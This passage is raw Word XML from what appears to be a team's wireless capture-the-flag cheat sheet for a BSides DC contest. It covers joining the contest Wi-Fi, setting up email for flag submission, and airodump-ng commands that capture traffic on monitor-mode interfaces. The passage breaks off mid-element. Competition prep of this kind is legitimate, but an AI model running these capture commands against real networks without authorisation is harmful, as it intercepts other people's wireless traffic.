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1BA2E4" w14:textId="77777777" w:rsidR="00062401" w:rsidRDefault="00C00747" w:rsidP="003C5340">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>DaKahuna</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00480CC6" w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00480CC6" w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>SimonJ</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00062401" w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00062401" w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>TheRedBaron</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D535A3" w14:textId="609E918D" w:rsidR="00C00747" w:rsidRPr="00013AE1" w:rsidRDefault="0012418B" w:rsidP="00013AE1">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>Battle Book</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18239F55" w14:textId="3D4545C6" w:rsidR="006E261B" w:rsidRDefault="006E261B" w:rsidP="00056E54">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Connect wlan0 to con </w:t>
      </w:r>
      <w:r w:rsidR="00013AE1" w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>WIFI</w:t>
      </w:r>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C549D2B" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26977141" w14:textId="32AA3093" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Open network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651D3401" w14:textId="609DF39B" w:rsidR="006E261B" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>fconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0 up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE29C38" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRPr="005408E2" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> “WCTF”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46165896" w14:textId="45D72BF5" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="612AE66F" w14:textId="1B8F168B" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:tab/>
        <w:t>WPA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9B14B2" w14:textId="4B75AC02" w:rsidR="00013AE1" w:rsidRPr="000C69E8" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wpa</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>_passphrase</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSides-wifi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> password &gt; /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wpa_supplicant</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wpa_supplicant.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6ABE249A" w14:textId="2195EC68" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BAE75BF" w14:textId="3E42C9A1" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wpa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B9ABA1" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08FA1A3B" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00013AE1" w:rsidRDefault="00A202A3" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24512545" w14:textId="41E49848" w:rsidR="006E261B" w:rsidRPr="00013AE1" w:rsidRDefault="006E261B" w:rsidP="00056E54">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Configure pine with proper email address for flag submissions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F105DF" w14:textId="77777777" w:rsidR="006E261B" w:rsidRDefault="006E261B" w:rsidP="006E261B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="143A6057" w14:textId="5EE82EEA" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="006E261B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:tab/>
        <w:t>Other capture:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594E4E19" w14:textId="6090D77A" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> --channel 1 –w /root/Desktop/dump wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C16EF26" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06E14506" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRPr="00C70BD1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">wlan1mon </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-regex </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSidesDC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">* </w:t>
      </w:r>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>–w</w:t>
      </w:r>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> /root/Desktop/CTF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
